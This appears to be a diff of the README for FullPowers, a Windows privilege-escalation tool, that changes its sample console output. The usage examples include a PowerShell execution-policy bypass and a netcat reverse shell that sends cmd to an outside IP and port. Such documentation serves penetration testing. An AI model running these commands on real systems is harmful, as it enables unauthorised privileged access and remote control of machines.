@@ -36,9 +36,7 @@ Optional arguments:
 ### Example 1, basic usage
 ```
 c:\TOOLS>FullPowers
-[+] Started dummy thread with id 9976
-[+] Successfully created scheduled task.
-[+] Got new token! Privilege count: 7
+[+] Successfully created scheduled task. PID=9976
 [+] CreateProcessAsUser() OK
 Microsoft Windows [Version 10.0.19041.84]
 (c) 2019 Microsoft Corporation. All rights reserved.
@@ -49,9 +47,7 @@ C:\WINDOWS\system32>
 ### Example 2, specify a custom command line
 ```
 c:\TOOLS>FullPowers -c "powershell -ep Bypass"
-[+] Started dummy thread with id 9028
-[+] Successfully created scheduled task.
-[+] Got new token! Privilege count: 7
+[+] Successfully created scheduled task. PID=9028
 [+] CreateProcessAsUser() OK
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -65,9 +61,7 @@ Bypass
 ### Example 3, start a netcat reverse shell and exit
 ```
 c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
-[+] Started dummy thread with id 5482
-[+] Successfully created scheduled task.
-[+] Got new token! Privilege count: 7
+[+] Successfully created scheduled task. PID=5482
 [+] CreateProcessAsUser() OK
 ```
 
